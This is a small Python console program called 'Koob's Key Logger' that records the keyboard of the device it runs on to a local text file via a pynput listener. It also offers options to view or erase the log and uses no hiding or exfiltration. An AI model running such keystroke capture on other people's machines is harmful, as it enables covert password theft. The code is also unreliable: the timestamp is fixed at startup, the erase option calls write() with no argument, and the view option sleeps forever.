import time
import datetime
import pynput
import os

# File start
class colors:
    PINK = '\033[95m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'

# Get local time 
now = datetime.datetime.now()
localTime = now.strftime("%Y-%m-%d %H:%M:%S") + " : "


print(colors.CYAN + "Welcome to Koob's Key Logger\n" + colors.CYAN)
time.sleep(1)

# Start menu
def menu():
    print(colors.GREEN + "What would you like to do?:\n" + colors.GREEN)
    print(colors.GREEN + "1. Record key strokes in your device" + colors.GREEN)
    print(colors.GREEN + "2. View the key strokes stored" + colors.GREEN)
    print(colors.GREEN + "3. Delete the stored data\n" + colors.GREEN)
    print(colors.YELLOW + "To stop recording data, close the script.py program\n" + colors.YELLOW)
    response = input()
        
# 1. Record data
    if response == '1':
        def on_press(key):
            try:
                key = key.char
                with open('records.txt', 'a') as docWrite:
                        docWrite.write(localTime + key + '\n')

                if key == '`':
                    quit()

            except AttributeError:
                # special characters
                key = str(key)
                with open('records.txt', 'a') as docWrite:
                    docWrite.write(localTime + key + '\n')
        os.system('cls')
        print(colors.CYAN + "Your key strokes are now being recorded: \nPress ` to stop recording.")
            

        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()


# 2. View data
    elif response == '2':
        os.system('cls')
        print(colors.GREEN + '---------------- Recorded Key Strokes ----------------\n' + colors.PINK)
        with open('records.txt', 'r') as docRead:
            docContents = docRead.read()
            print("\n" + docContents)

        while True:
            time.sleep(3600)
            
# 3. Overwrite data
    elif response == '3':
        os.system('cls')
        print(colors.GREEN + 'Data has been erased: \n')
        with open('records.txt', 'w') as docOverWrite:
            docOverWrite.write()


menu()